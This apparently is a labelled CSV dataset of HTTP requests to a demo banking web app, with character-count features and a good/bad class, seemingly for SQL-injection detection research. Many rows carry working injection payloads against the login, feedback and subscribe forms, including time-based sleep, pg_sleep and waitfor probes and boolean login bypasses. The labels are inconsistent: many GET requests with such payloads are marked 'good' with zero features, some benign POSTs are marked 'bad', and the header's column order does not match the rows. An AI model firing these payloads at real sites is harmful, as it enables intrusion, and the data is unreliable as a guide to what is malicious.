method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,if(now()=sysdate()%2Csleep(9)%2C0)&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,8,0,2,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=v2hkXpoK';select%20pg_sleep(5);%20--%20,/doSubscribe,2,0,2,2,3,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=sample%40email.tst%25'%20AND%202*3*8=6*8%20AND%20'mU2R'!='mU2R%25,/doSubscribe,8,0,0,0,4,0,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,0,10,2,2,bad
GET,,/index.jsp?content=6Fe2mSlv';%20waitfor%20delay%20'0:0:6'%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=48KlGBeM'));select%20pg_sleep(3);%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/images/,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,VwdrQmq7';%20waitfor%20delay%20'0:0:6'%20--%20&txtEmail=sample%40email.tst,/doSubscribe,6,0,2,0,5,4,bad
GET,,"/disclaimer.htm?url=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z",0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=ZzDmd8LR';%20waitfor%20delay%20'0:0:5'%20--%20,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=0'XOR(if(now()=sysdate()%2Csleep(14)%2C0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,0,10,2,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B893-893-1=0%2B0%2B0%2B1&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B116-116-1=0%2B0%2B0%2B1%20--%20&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"1'""&txtEmail=sample%40email.tst",/doSubscribe,2,2,0,0,0,0,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&subject=1",/sendFeedback,4,4,0,30,2,18,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B851-851-1=0%2B0%2B0%2B1&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203%2B23-23-1=0%2B0%2B0%2B1%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,4,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=jpPs6VxA';select%20pg_sleep(6);%20--%20,/sendFeedback,2,0,2,2,5,4,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,4,0,2,0,7,4,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,OD1e8y0s&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,"(select(0)from(select(sleep(34.974)))v)/*'%2B(select(0)from(select(sleep(34.974)))v)%2B'""%2B(select(0)from(select(sleep(34.974)))v)%2B""*/&passw=g00dPa%24%24w0rD&uid=1",/doLogin,4,4,0,30,0,20,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=VgxOFwke'));select%20pg_sleep(9);%20--%20&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2B5%2B449-449)%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,2,6,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%F0''%F0""""&subject=1",/sendFeedback,4,4,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=-1'%20OR%202%2B789-789-1=0%2B0%2B0%2B1%20or%20'nxS1wsrE'='&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,8,0,0,0,6,0,bad
POST,submit=%20Submit%20&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=zsZTIAdV';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,6,0,2,0,7,4,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=HVB81H4n&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=eOWBMH9z'));select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=LmyCEUWn');select%20pg_sleep(9);%20--%20&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm""%20AND%202*3*8=6*8%20AND%20""HeG2""=""HeG2&job=Teller:ConsumaerBanking",0,0,0,0,0,0,good
POST,JyI=&txtEmail=sample%40email.tst,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=%40%40vyfTn&uid=e,/doLogin,0,0,0,0,0,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2B466-466-1=0%2B0%2B0%2B1%20--%20&subject=1,/sendFeedback,2,0,2,0,6,0,bad
POST,"0""XOR(if(now()=sysdate()%2Csleep(23.316)%2C0))XOR""Z&passw=g00dPa%24%24w0rD&uid=1",/doLogin,0,4,0,10,0,4,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=%5C,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/favicon.ico,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,"/index.jsp?content=%F0''%F0""""&job=ExecutiveAssistant:Administration",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=1%00%C0%A7%C0%A2%252527%252522,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,"0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,4,0,10,0,2,bad
POST,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2B5%2B914-914)%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,2,4,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=http://www.netscape.com,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=-1%20OR%202%2B41-41-1=0%2B0%2B0%2B1%20--%20&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,0,6,0,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
POST,-1%20OR%202%2B121-121-1=0%2B0%2B0%2B1%20--%20&txtEmail=sample%40email.tst,/doSubscribe,0,0,2,0,4,0,bad
GET,,"/index.jsp?content=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&job=LoyaltyMarketingProgramManager:Marketing",0,0,0,0,0,0,good
GET,,"/index.jsp?content=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&job=CustomerServiceRepresentative:CustomerService",0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
POST,cKw45Zw1');select%20pg_sleep(11.658);%20--%20&passw=g00dPa%24%24w0rD&uid=1,/doLogin,2,0,2,2,3,6,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Documents/,0,0,0,0,0,0,good
GET,,/index.jsp?content=%5C&job=MortgageLendingAccountExecutive:Sales,0,0,0,0,0,0,good
POST,"btnSubmit=Login&passw=%F0''%F0""""&uid=1",/doLogin,4,4,0,0,0,2,bad
GET,,/index.jsp?content=pr/20061109.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=%5C&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/doLogin,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=%F0''%F0""""",/sendFeedback,4,4,0,0,2,0,bad
POST,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2B5%2B623-623)%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,2,4,2,bad
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=777',0,0,0,0,0,0,good
GET,,/index.jsp?content=personal_loans.htm,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20914=914%20or%20'QmbTa8Nm'='&uid=1,/doLogin,8,0,0,0,6,2,bad
POST,-1%20OR%202%2B535-535-1=0%2B0%2B0%2B1&passw=g00dPa%24%24w0rD&uid=e,/doLogin,0,0,0,0,2,2,bad
GET,,/index.jsp?content=D2XeIOYH'));select%20pg_sleep(9);%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
POST,"1'""&passw=g00dPa%24%24w0rD&uid=e",/doLogin,2,2,0,0,0,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z&template=US,0,0,0,0,0,0,good
GET,,/default.jsp?content=88',0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2B5%2B27-27)%20or%20'kQWwwMxI'='&uid=1,/doLogin,8,0,0,2,4,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_community.htm,0,0,0,0,0,0,good
GET,,/swagger/index.html,0,0,0,0,0,0,good
GET,,"/util/serverStatusCheckService.jsp?HostName=1'""",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,0,0,2,0,bad
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5C&subject=1,/sendFeedback,0,0,0,0,2,0,bad
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:3'%20--%20,/doLogin,4,0,2,0,5,6,bad
GET,,/Privacypolicy.jsp?sec=Careers&template=kumvsGUU'));select%20pg_sleep(3);%20--%20,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=Careers&template=1'""",0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,0,4,0,10,2,2,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JkHPsdvW'));select%20pg_sleep(6);%20--%20,/doLogin,2,0,2,2,3,6,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,"/1'""1000",0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,"submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z",/sendFeedback,0,4,0,10,2,2,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=business_lending.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=1%00%C0%A7%C0%A2%252527%252522,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=-1%20OR%203*2<(0%2B5%2B785-785)%20--%20,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=9NCXSvRl';select%20pg_sleep(9);%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B117-117-1=0%2B0%2B0%2B1&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%2023=23%20or%20'pfTIODsN'='&uid=e,/doLogin,8,0,0,0,6,2,bad
POST,iEKqzxEd'));select%20pg_sleep(14.81);%20--%20&passw=g00dPa%24%24w0rD&uid=e,/doLogin,2,0,2,2,3,6,bad
GET,,/sitemap.xml,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=business_other.htm,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&txtEmail=sample%40email.tst",/doSubscribe,0,4,0,10,0,2,bad
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/swagger,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%203%2B117-117-1=0%2B0%2B0%2B1&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%20000623=000623%20AND%203%2B1-1-1=1%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,0,6,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=KKpZBcqT';%20waitfor%20delay%20'0:0:9'%20--%20,0,0,0,0,0,0,good
